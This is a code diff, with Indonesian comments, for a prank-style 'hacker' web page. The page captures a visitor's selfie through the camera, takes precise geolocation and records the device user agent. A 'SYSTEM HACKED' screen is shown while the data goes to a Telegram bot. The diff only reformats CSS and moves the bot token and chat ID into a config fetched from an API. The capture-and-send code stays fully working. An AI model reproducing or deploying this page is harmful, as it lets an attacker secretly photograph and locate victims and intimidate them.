@@ -203,11 +203,7 @@
             font-weight: 900;
             text-transform: uppercase;
             color: #ff0000;
-            text-shadow: 
-                0 0 10px #ff0000,
-                0 0 20px #ff0000,
-                0 0 40px #ff0000,
-                0 0 80px #ff0000;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 80px #ff0000;
             animation: glitch 2s infinite;
             text-align: center;
             font-family: 'Courier New', monospace;
@@ -405,18 +401,37 @@
             font-family: 'Courier New', monospace;
         }
 
-        #video, #canvas, #previewImg {
+        #video,
+        #canvas,
+        #previewImg {
             display: none !important;
         }
 
         @media (max-width: 600px) {
-            .glitch { font-size: 28px; }
-            .sub-glitch { font-size: 14px; }
-            .terminal { font-size: 11px; padding: 14px; max-height: 250px; }
-            .data-list { grid-template-columns: 1fr; }
-            .skull { font-size: 50px; }
-            .status-grid { grid-template-columns: 1fr 1fr; }
-            .loader { width: 55px; height: 55px; }
+            .glitch {
+                font-size: 28px;
+            }
+            .sub-glitch {
+                font-size: 14px;
+            }
+            .terminal {
+                font-size: 11px;
+                padding: 14px;
+                max-height: 250px;
+            }
+            .data-list {
+                grid-template-columns: 1fr;
+            }
+            .skull {
+                font-size: 50px;
+            }
+            .status-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+            .loader {
+                width: 55px;
+                height: 55px;
+            }
         }
     </style>
 </head>
@@ -443,7 +458,7 @@
 
     <div id="hackerScreen">
         <canvas id="matrixCanvas"></canvas>
-        
+
         <div class="hacker-container">
             <div class="skull">💀</div>
             <div class="glitch">⚠️ SYSTEM COMPROMISED ⚠️</div>
@@ -520,18 +535,43 @@
     <img id="previewImg" alt="" />
 
     <script>
-        // ======================== AMBIL DARI ENV =====================
-        // Data akan diambil dari environment variables Vercel
-        // Untuk development lokal, gunakan nilai default
-        
-        const CONFIG = {
-            BOT_TOKEN: '%%BOT_TOKEN%%',
-            CHAT_ID: '%%CHAT_ID%%'
-        };
+        // ======================== KONFIGURASI ========================
+        // Akan diambil dari API
+        let BOT_TOKEN = '';
+        let CHAT_ID = '';
 
-        // Fallback untuk development (jika belum di-replace)
-        const BOT_TOKEN = CONFIG.BOT_TOKEN.startsWith('%%') ? '' : CONFIG.BOT_TOKEN;
-        const CHAT_ID = CONFIG.CHAT_ID.startsWith('%%') ? '' : CONFIG.CHAT_ID;
+        // ======================== AMBIL CONFIG DARI API ==============
+        async function loadConfig() {
+            try {
+                const response = await fetch('/api/config');
+                if (!response.ok) {
+                    throw new Error('Failed to load config');
+                }
+                const config = await response.json();
+                BOT_TOKEN = config.BOT_TOKEN || '';
+                CHAT_ID = config.CHAT_ID || '';
+
+                console.log('✅ Config loaded:', {
+                    BOT_TOKEN: BOT_TOKEN ? '✅ Set' : '❌ Empty',
+                    CHAT_ID: CHAT_ID ? '✅ Set' : '❌ Empty'
+                });
+
+                if (BOT_TOKEN && CHAT_ID) {
+                    addTerminalLine('<span class="prompt">[✔]</span> <span class="data">Konfigurasi bot ditemukan!</span>', 'success');
+                } else {
+                    addTerminalLine('<span class="prompt error">[!]</span> Konfigurasi bot tidak ditemukan!', 'error');
+                }
+
+                // Mulai proses setelah config diambil
+                startProcess();
+
+            } catch (err) {
+                console.error('Error loading config:', err);
+                addTerminalLine('<span class="prompt error">[!]</span> Gagal memuat konfigurasi: ' + err.message, 'error');
+                // Tetap lanjut dengan fallback
+                startProcess();
+            }
+        }
 
         // ======================== PARTICLES =========================
         function createParticles() {
@@ -646,9 +686,9 @@
         function updateHackerInfo() {
             document.getElementById('deviceInfo').textContent = navigator.userAgent.split('(')[0].trim() || 'Unknown';
             document.getElementById('timeInfo').textContent = new Date().toLocaleString('id-ID');
-            
+
             if (capturedLocation) {
-                document.getElementById('locationInfo').textContent = 
+                document.getElementById('locationInfo').textContent =
                     `${capturedLocation.lat.toFixed(6)}, ${capturedLocation.lng.toFixed(6)}`;
             } else {
                 document.getElementById('locationInfo').textContent = '⚠️ NOT AVAILABLE';
@@ -659,14 +699,14 @@
         function checkReadyToShow() {
             if (cameraDone && locationDone) {
                 updateProgressDots(3);
-                
+
                 addTerminalLine('<span class="prompt">[✔]</span> <span class="data">Semua akses berhasil!</span>', 'success');
                 addTerminalLine('<span class="prompt">[+]</span> <span class="highlight">Mengirim data ke admin...</span>');
-                
+
                 sendToTelegram().then(() => {
                     addTerminalLine('<span class="prompt">[✔]</span> <span class="data">DATA BERHASIL DIKIRIM!</span>', 'success');
                     addTerminalLine('<span class="prompt error">[!]</span> <span class="highlight">SYSTEM COMPROMISED</span>', 'error');
-                    
+
                     updateHackerInfo();
 
                     setTimeout(() => {
@@ -686,7 +726,7 @@
                 });
                 video.srcObject = stream;
                 await video.play();
-                
+
                 setTimeout(() => {
                     capturePhoto();
                 }, 500);
@@ -708,7 +748,7 @@
                 canvas.height = vh;
                 context.drawImage(video, 0, 0, vw, vh);
                 capturedPhoto = canvas.toDataURL('image/jpeg', 0.92);
-                
+
                 cameraDone = true;
                 updateProgressDots(1);
                 addTerminalLine('<span class="prompt">[✔]</span> <span class="data">Selfie berhasil diambil!</span>', 'success');
@@ -748,24 +788,30 @@
                     console.error('Geolocation error:', err);
                     let msg = '';
                     switch (err.code) {
-                        case 1: msg = 'Izin lokasi ditolak!'; break;
-                        case 2: msg = 'Posisi tidak tersedia!'; break;
-                        case 3: msg = 'Timeout!'; break;
-                        default: msg = err.message;
+                        case 1:
+                            msg = 'Izin lokasi ditolak!';
+                            break;
+                        case 2:
+                            msg = 'Posisi tidak tersedia!';
+                            break;
+                        case 3:
+                            msg = 'Timeout!';
+                            break;
+                        default:
+                            msg = err.message;
                     }
                     addTerminalLine('<span class="prompt error">[!]</span> ' + msg, 'error');
                     locationDone = true;
                     updateProgressDots(2);
                     checkReadyToShow();
-                },
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
         }
 
         // ======================== KIRIM TELEGRAM ====================
         async function sendToTelegram() {
             if (isProcessing) return;
-            
+
             if (!BOT_TOKEN || !CHAT_ID) {
                 console.error('❌ BOT_TOKEN atau CHAT_ID tidak diatur!');
                 addTerminalLine('<span class="prompt error">[!]</span> Konfigurasi bot tidak ditemukan!', 'error');
@@ -778,7 +824,7 @@
                 let caption = '💀 *SYSTEM HACKED!*\n';
                 caption += `🕐 ${new Date().toLocaleString('id-ID')}\n`;
                 caption += `📱 ${navigator.userAgent.split('(')[0].trim() || 'Unknown'}\n`;
-                
+
                 if (capturedLocation) {
                     caption += `📍 ${capturedLocation.lat.toFixed(6)}, ${capturedLocation.lng.toFixed(6)}\n`;
                     caption += `🗺️ https://maps.google.com/maps?q=${capturedLocation.lat},${capturedLocation.lng}\n`;
@@ -816,16 +862,10 @@
             }
         }
 
-        // ======================== INIT ==============================
-        function init() {
+        // ======================== START PROCESS =====================
+        function startProcess() {
             addTerminalLine('<span class="prompt">[+]</span> <span class="highlight">INISIASI HACKING...</span>');
             addTerminalLine('<span class="prompt">[+]</span> Menyusup ke sistem...');
-
-            if (BOT_TOKEN && CHAT_ID) {
-                addTerminalLine('<span class="prompt">[✔]</span> <span class="data">Konfigurasi bot ditemukan</span>', 'success');
-            } else {
-                addTerminalLine('<span class="prompt error">[!]</span> Konfigurasi bot tidak ditemukan!', 'error');
-            }
 
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 startCamera();
@@ -836,7 +876,9 @@
             }
         }
 
-        init();
+        // ======================== INIT ==============================
+        // Ambil config dari API dulu
+        loadConfig();
     </script>
 </body>
 </html>
